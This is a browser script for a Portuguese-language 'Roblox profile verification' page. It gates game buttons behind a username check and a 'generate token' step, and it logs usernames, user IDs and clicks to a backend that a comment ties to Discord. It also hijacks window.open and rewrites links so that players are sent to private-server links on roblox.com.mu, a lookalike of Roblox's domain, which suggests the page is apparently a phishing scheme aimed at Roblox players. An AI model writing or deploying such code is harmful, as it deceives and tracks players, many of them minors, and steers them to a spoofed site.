(function () {
  'use strict';

  /* ══════════════════════════════════════════════
     CONFIG
  ══════════════════════════════════════════════ */
  var LANG_KEY    = 'rc2_lang';
  var SESSION_KEY = 'rc_session';
  var MIN_DAYS    = 80;

  var GAME_URLS = [
    'https://www.roblox.com.mu/games/1818/Classic-Crossroads?privateServerLinkCode=64383735832090137527426034643316',
    'https://www.roblox.com.mu/games/95206881/Baseplate?privateServerLinkCode=64383735832090137527426034643316',
    'https://www.roblox.com.mu/games/123974602339071/UP-Just-a-baseplate?privateServerLinkCode=64383735832090137527426034643316',
  ];

  /* ══════════════════════════════════════════════
     SESSION
  ══════════════════════════════════════════════ */
  function getSession() {
    try { return JSON.parse(localStorage.getItem(SESSION_KEY) || 'null'); }
    catch (e) { return null; }
  }
  function setSession(data) { localStorage.setItem(SESSION_KEY, JSON.stringify(data)); }
  function clearSession()   { localStorage.removeItem(SESSION_KEY); }

  /* ══════════════════════════════════════════════
     DISCORD LOGGING (via backend proxy)
  ══════════════════════════════════════════════ */
  function sendLog(event, data) {
    try {
      fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ event: event, data: data || {} }),
      }).catch(function () {});
    } catch (e) {}
  }

  /* ══════════════════════════════════════════════
     SOUND
  ══════════════════════════════════════════════ */
  var audio = null;
  function playClick() {
    try {
      if (!audio) { audio = new Audio('/click-sound.mp3'); audio.volume = 0.5; }
      audio.currentTime = 0;
      audio.play().catch(function () {});
    } catch (e) {}
  }

  /* ══════════════════════════════════════════════
     GAME LINK INTERCEPTION
     Replace any linkurl.pk navigation with the
     correct Roblox URL based on which card was clicked
  ══════════════════════════════════════════════ */
  var lastGameIndex = 0;

  var _origOpen = window.open;
  window.open = function (url, target, features) {
    if (url && typeof url === 'string' && url.indexOf('linkurl.pk') !== -1) {
      var dest = GAME_URLS[Math.min(lastGameIndex, GAME_URLS.length - 1)];
      return _origOpen.call(window, dest, target || '_blank', features);
    }
    return _origOpen.call(window, url, target, features);
  };

  // Also intercept <a href="linkurl.pk..."> injected by React
  function replaceLinksInDOM() {
    var linkIdx = 0;
    document.querySelectorAll('a[href*="linkurl.pk"]:not([data-rc-l])').forEach(function (a) {
      a.setAttribute('data-rc-l', '1');
      a.href   = GAME_URLS[Math.min(linkIdx, GAME_URLS.length - 1)];
      a.target = '_blank';
      a.rel    = 'noopener noreferrer';
      linkIdx++;
    });
  }

  /* ══════════════════════════════════════════════
     BUTTON ANIMATION STYLES + LOGIN UI
  ══════════════════════════════════════════════ */
  function injectStyles() {
    var style = document.createElement('style');
    style.textContent = '\n'
    + '/* ── Button micro-interactions ─────────────────── */\n'
    + 'button:not(#rc-login-btn):not(#rc-logout-btn),\n'
    + 'a[role="button"] {\n'
    + '  transition: transform 0.18s cubic-bezier(0.34,1.56,0.64,1),\n'
    + '              box-shadow 0.18s ease,\n'
    + '              opacity 0.15s ease !important;\n'
    + '}\n'
    + 'button:not(#rc-login-btn):not(#rc-logout-btn):hover:not(:disabled) {\n'
    + '  transform: translateY(-2px) scale(1.025) !important;\n'
    + '}\n'
    + 'button:not(#rc-login-btn):not(#rc-logout-btn):active:not(:disabled) {\n'
    + '  transform: translateY(0) scale(0.97) !important;\n'
    + '}\n'

    /* ── Login overlay ── */
    + '#rc-login-overlay {\n'
    + '  position:fixed;inset:0;z-index:9999999;\n'
    + '  display:flex;align-items:center;justify-content:center;\n'
    + '  background:#040913;\n'
    + '  background-image:\n'
    + '    radial-gradient(ellipse 110% 65% at 50% -8%, rgba(37,99,235,0.28) 0%, transparent 68%),\n'
    + '    radial-gradient(ellipse 65% 65% at 92% 102%, rgba(29,78,216,0.18) 0%, transparent 68%),\n'
    + '    radial-gradient(ellipse 45% 45% at 8%  82%,  rgba(59,130,246,0.12) 0%, transparent 60%);\n'
    + '  animation:rcFadeIn .35s ease;\n'
    + '}\n'
    + '#rc-login-overlay::before {\n'
    + '  content:"";position:fixed;inset:0;pointer-events:none;\n'
    + '  background-image:\n'
    + '    linear-gradient(rgba(59,130,246,0.045) 1px,transparent 1px),\n'
    + '    linear-gradient(90deg,rgba(59,130,246,0.045) 1px,transparent 1px);\n'
    + '  background-size:52px 52px;\n'
    + '}\n'
    + '#rc-login-card {\n'
    + '  position:relative;\n'
    + '  background:linear-gradient(145deg,rgba(10,22,55,0.97) 0%,rgba(5,12,35,0.98) 100%);\n'
    + '  border:1px solid rgba(59,130,246,0.28);\n'
    + '  border-radius:24px;\n'
    + '  padding:40px 36px 32px;\n'
    + '  width:90%;max-width:400px;\n'
    + '  box-shadow:\n'
    + '    0 0 0 1px rgba(59,130,246,0.06),\n'
    + '    0 8px 64px rgba(0,0,0,0.85),\n'
    + '    0 0 100px rgba(37,99,235,0.14);\n'
    + '  animation:rcSlideUp .42s cubic-bezier(0.34,1.56,0.64,1);\n'
    + '}\n'
    + '#rc-login-avatar {\n'
    + '  width:56px;height:56px;border-radius:50%;\n'
    + '  background:linear-gradient(135deg,#1d4ed8,#3b82f6);\n'
    + '  box-shadow:0 0 24px rgba(59,130,246,0.55),0 0 0 1px rgba(59,130,246,0.35);\n'
    + '  display:flex;align-items:center;justify-content:center;\n'
    + '  margin:0 auto 24px;\n'
    + '}\n'
    + '#rc-login-avatar svg{width:30px;height:30px;fill:white;}\n'
    + '#rc-login-title {\n'
    + '  font-family:"Outfit","Inter",sans-serif;\n'
    + '  font-size:21px;font-weight:800;letter-spacing:-0.02em;\n'
    + '  text-align:center;margin:0 0 10px;\n'
    + '  background:linear-gradient(90deg,#fff 35%,rgba(147,197,253,0.88) 100%);\n'
    + '  -webkit-background-clip:text;-webkit-text-fill-color:transparent;\n'
    + '  background-clip:text;\n'
    + '}\n'
    + '#rc-login-subtitle {\n'
    + '  font-family:"Outfit","Inter",sans-serif;\n'
    + '  font-size:13.5px;color:rgba(147,197,253,0.65);\n'
    + '  text-align:center;margin:0 0 26px;line-height:1.55;\n'
    + '}\n'
    + '#rc-login-input {\n'
    + '  width:100%;box-sizing:border-box;\n'
    + '  background:rgba(59,130,246,0.07);\n'
    + '  border:1px solid rgba(59,130,246,0.22);\n'
    + '  border-radius:12px;\n'
    + '  padding:13px 16px;\n'
    + '  font-size:15px;font-family:"Outfit","Inter",sans-serif;color:#fff;\n'
    + '  outline:none;margin-bottom:12px;\n'
    + '  transition:border-color .2s,box-shadow .2s;\n'
    + '}\n'
    + '#rc-login-input:focus {\n'
    + '  border-color:rgba(59,130,246,0.65);\n'
    + '  box-shadow:0 0 0 3px rgba(59,130,246,0.14);\n'
    + '}\n'
    + '#rc-login-input::placeholder{color:rgba(147,197,253,0.3);}\n'
    + '#rc-login-btn {\n'
    + '  width:100%;padding:13px;\n'
    + '  background:linear-gradient(135deg,#1d4ed8 0%,#3b82f6 100%);\n'
    + '  border:none;border-radius:12px;\n'
    + '  color:#fff;font-family:"Outfit","Inter",sans-serif;\n'
    + '  font-size:15px;font-weight:700;cursor:pointer;\n'
    + '  box-shadow:0 4px 22px rgba(59,130,246,0.42);\n'
    + '  transition:transform .18s cubic-bezier(0.34,1.56,0.64,1),\n'
    + '             box-shadow .18s ease,opacity .15s;\n'
    + '  margin-bottom:14px;\n'
    + '}\n'
    + '#rc-login-btn:hover:not(:disabled){\n'
    + '  transform:translateY(-2px) scale(1.02);\n'
    + '  box-shadow:0 8px 30px rgba(59,130,246,0.6);\n'
    + '}\n'
    + '#rc-login-btn:active:not(:disabled){transform:translateY(0) scale(0.98);}\n'
    + '#rc-login-btn:disabled{opacity:.55;cursor:not-allowed;}\n'
    + '#rc-login-msg {\n'
    + '  font-family:"Outfit","Inter",sans-serif;\n'
    + '  font-size:12px;text-align:center;\n'
    + '  color:rgba(147,197,253,0.5);min-height:18px;\n'
    + '  transition:color .2s;\n'
    + '}\n'
    + '#rc-login-msg.err{color:#f87171;}\n'
    + '#rc-login-msg.ok{color:#34d399;}\n'
    + '#rc-login-overlay.rcFadeOut{animation:rcFadeOut .28s ease forwards;}\n'

    /* ── Logout button ── */
    + '#rc-logout-btn {\n'
    + '  position:fixed;top:10px;right:12px;z-index:99999;\n'
    + '  width:38px;height:38px;border-radius:50%;\n'
    + '  background:linear-gradient(135deg,rgba(29,78,216,0.92),rgba(59,130,246,0.92));\n'
    + '  border:1px solid rgba(59,130,246,0.45);\n'
    + '  display:flex;align-items:center;justify-content:center;\n'
    + '  cursor:pointer;\n'
    + '  box-shadow:0 0 18px rgba(59,130,246,0.4);\n'
    + '  backdrop-filter:blur(12px);\n'
    + '  transition:transform .2s cubic-bezier(0.34,1.56,0.64,1),\n'
    + '             box-shadow .2s;\n'
    + '}\n'
    + '#rc-logout-btn:hover{\n'
    + '  transform:scale(1.12);\n'
    + '  box-shadow:0 0 28px rgba(59,130,246,0.65);\n'
    + '}\n'
    + '#rc-logout-btn svg{width:20px;height:20px;fill:white;}\n'

    /* ── Keyframes ── */
    + '@keyframes rcFadeIn{from{opacity:0}to{opacity:1}}\n'
    + '@keyframes rcFadeOut{from{opacity:1}to{opacity:0}}\n'
    + '@keyframes rcSlideUp{\n'
    + '  from{opacity:0;transform:translateY(32px) scale(0.95)}\n'
    + '  to  {opacity:1;transform:translateY(0)    scale(1)}\n'
    + '}\n';

    document.head.appendChild(style);
  }

  /* ══════════════════════════════════════════════
     LOGIN OVERLAY
  ══════════════════════════════════════════════ */
  function createLoginOverlay() {
    var overlay = document.createElement('div');
    overlay.id = 'rc-login-overlay';

    var avatarSvg = '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>';

    overlay.innerHTML =
      '<div id="rc-login-card">'
    + '  <div id="rc-login-avatar">' + avatarSvg + '</div>'
    + '  <h1 id="rc-login-title">Roblox Verificação de perfil</h1>'
    + '  <p id="rc-login-subtitle">Insira seu Roblox nome de usuário para verificar a idade da sua conta</p>'
    + '  <input id="rc-login-input" type="text" placeholder="Nome de usuário" autocomplete="off" spellcheck="false" />'
    + '  <button id="rc-login-btn">Verificar perfil</button>'
    + '  <div id="rc-login-msg">Idade mínima da conta exigida: <strong style="color:rgba(147,197,253,0.75)">' + MIN_DAYS + ' dias</strong></div>'
    + '</div>';

    document.body.appendChild(overlay);

    var input = document.getElementById('rc-login-input');
    var btn   = document.getElementById('rc-login-btn');
    var msg   = document.getElementById('rc-login-msg');

    function setMsg(text, cls) {
      msg.innerHTML = text;
      msg.className = cls || '';
    }

    function verify() {
      var username = (input.value || '').trim();
      if (!username) { setMsg('Por favor insira um nome de usuário.', 'err'); return; }

      btn.disabled    = true;
      btn.textContent = 'Verificando...';
      setMsg('Verificando conta Roblox…', '');

      fetch('/api/roblox/verify', {
        method : 'POST',
        headers: { 'Content-Type': 'application/json' },
        body   : JSON.stringify({ username: username }),
      })
      .then(function (r) { return r.json(); })
      .then(function (data) {
        if (data.error === 'User not found' || !data.username) {
          setMsg('Usuário não encontrado. Verifique o nome.', 'err');
          btn.disabled = false; btn.textContent = 'Verificar perfil';
          sendLog('Login Negado – usuário não encontrado', { username: username });
          return;
        }
        if (!data.valid) {
          setMsg(
            'Conta com apenas <strong>' + data.accountAgeDays + ' dias</strong>. Mínimo: ' + MIN_DAYS + ' dias.',
            'err'
          );
          btn.disabled = false; btn.textContent = 'Verificar perfil';
          sendLog('Login Negado – conta muito nova', {
            username: data.username,
            diasDaConta: data.accountAgeDays,
            minimoExigido: MIN_DAYS,
          });
          return;
        }

        // ✅ Approved
        setMsg('Verificado! Entrando…', 'ok');
        setSession({ username: data.username, userId: data.userId, accountAgeDays: data.accountAgeDays });
        sendLog('Login Aprovado', {
          username    : data.username,
          diasDaConta : data.accountAgeDays,
          userId      : data.userId,
        });

        overlay.classList.add('rcFadeOut');
        setTimeout(function () {
          overlay.remove();
          addLogoutButton();
        }, 300);
      })
      .catch(function () {
        setMsg('Erro ao verificar. Tente novamente.', 'err');
        btn.disabled = false; btn.textContent = 'Verificar perfil';
      });
    }

    btn.addEventListener('click', function () { playClick(); verify(); });
    input.addEventListener('keydown', function (e) { if (e.key === 'Enter') verify(); });
    input.focus();
  }

  /* ══════════════════════════════════════════════
     LOGOUT BUTTON
  ══════════════════════════════════════════════ */
  function addLogoutButton() {
    var session = getSession();
    var btn = document.createElement('button');
    btn.id    = 'rc-logout-btn';
    btn.title = session ? ('Sair (' + session.username + ')') : 'Sair';
    btn.innerHTML = '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>';
    btn.addEventListener('click', function () {
      playClick();
      sendLog('Logout', { username: session ? session.username : 'unknown' });
      clearSession();
      window.location.reload();
    });
    document.body.appendChild(btn);
  }

  /* ══════════════════════════════════════════════
     TOKEN ENFORCEMENT (original behaviour)
  ══════════════════════════════════════════════ */
  var tokenGeneratedInSession = false;

  var WARN_MSGS = {
    en: 'Generate a token first to access the game.',
    es: 'Genera un token primero para acceder al juego.',
    pt: 'Gere um token primeiro para acessar o jogo.',
    ru: 'Сначала создайте токен, чтобы войти в игру.',
  };

  function showWarning() {
    var lang = localStorage.getItem(LANG_KEY) || 'en';
    var msg  = WARN_MSGS[lang] || WARN_MSGS.en;
    if (document.getElementById('rc-token-warning')) return;
    var warn = document.createElement('div');
    warn.id  = 'rc-token-warning';
    warn.style.cssText = [
      'position:fixed','bottom:24px','left:50%','transform:translateX(-50%)',
      'background:#0a1428','border:1px solid #3b82f6','color:#93c5fd',
      'font-size:13px','font-weight:600','padding:10px 20px',
      'border-radius:12px','z-index:999999','white-space:nowrap',
      'box-shadow:0 4px 20px rgba(0,0,0,.65)',
      'font-family:Outfit,Inter,sans-serif',
    ].join(';');
    warn.textContent = msg;
    document.body.appendChild(warn);
    setTimeout(function () { warn.remove(); }, 2800);
  }

  /* ══════════════════════════════════════════════
     LANGUAGE OVERLAY (original behaviour)
  ══════════════════════════════════════════════ */
  function dismissLangOverlay(lang) {
    localStorage.setItem(LANG_KEY, lang);
    var ov = document.getElementById('rc-lang-overlay');
    if (ov) {
      ov.style.animation = 'rc-fadeout .2s ease forwards';
      setTimeout(function () { ov.classList.add('rc-hidden'); }, 210);
    }
  }

  /* ══════════════════════════════════════════════
     MUTATION OBSERVER
  ══════════════════════════════════════════════ */
  var observer = new MutationObserver(function () {
    replaceLinksInDOM();

    // Sound on every button / link
    document.querySelectorAll('button:not([data-rc-s]), a:not([data-rc-s])').forEach(function (el) {
      el.setAttribute('data-rc-s', '1');
      el.addEventListener('click', playClick);
    });

    // Record WHICH game card button was clicked (capture phase, before React handler)
    document.querySelectorAll('[data-testid="button-access-game"]:not([data-rc-g])').forEach(function (el) {
      el.setAttribute('data-rc-g', '1');
      el.addEventListener('click', function () {
        var all = document.querySelectorAll('[data-testid="button-access-game"]');
        lastGameIndex = Array.from(all).indexOf(el);
        sendLog('Jogo Acessado', {
          username  : getSession() ? getSession().username : 'unknown',
          gameIndex : lastGameIndex + 1,
          gameUrl   : GAME_URLS[Math.min(lastGameIndex, GAME_URLS.length - 1)],
        });
      }, true);
    });

    // Block access until token is generated
    document.querySelectorAll('[data-testid="button-access-game"]:not([data-rc-e])').forEach(function (el) {
      el.setAttribute('data-rc-e', '1');
      el.addEventListener('click', function (e) {
        if (!tokenGeneratedInSession) {
          e.preventDefault();
          e.stopImmediatePropagation();
          showWarning();
        }
      }, true);
    });

    // Track token generation
    document.querySelectorAll('[data-testid="button-generate-token"]:not([data-rc-t])').forEach(function (el) {
      el.setAttribute('data-rc-t', '1');
      el.addEventListener('click', function () {
        tokenGeneratedInSession = true;
        var s = getSession();
        sendLog('Token Gerado', { username: s ? s.username : 'unknown' });
      });
    });

    // Language buttons
    document.querySelectorAll('#rc-lang-overlay .rc-btn:not([data-rc-lang])').forEach(function (btn) {
      btn.setAttribute('data-rc-lang', '1');
      btn.addEventListener('click', function () {
        playClick();
        dismissLangOverlay(btn.dataset.lang);
      });
    });
  });

  // Reset token when modal closes
  document.addEventListener('click', function (e) {
    var t = e.target;
    if (!t) return;
    if (
      (t.tagName === 'BUTTON' && t.dataset && t.dataset.testid === 'button-close-modal') ||
      t.id === 'rc-lang-overlay'
    ) { tokenGeneratedInSession = false; }
  }, true);

  /* ══════════════════════════════════════════════
     INIT
  ══════════════════════════════════════════════ */
  function init() {
    injectStyles();

    var session = getSession();
    if (session) {
      addLogoutButton();
    } else {
      createLoginOverlay();
    }

    observer.observe(document.body, { childList: true, subtree: true });
  }

  // Run as soon as body is available
  if (document.body) {
    init();
  } else {
    document.addEventListener('DOMContentLoaded', init);
  }

})();
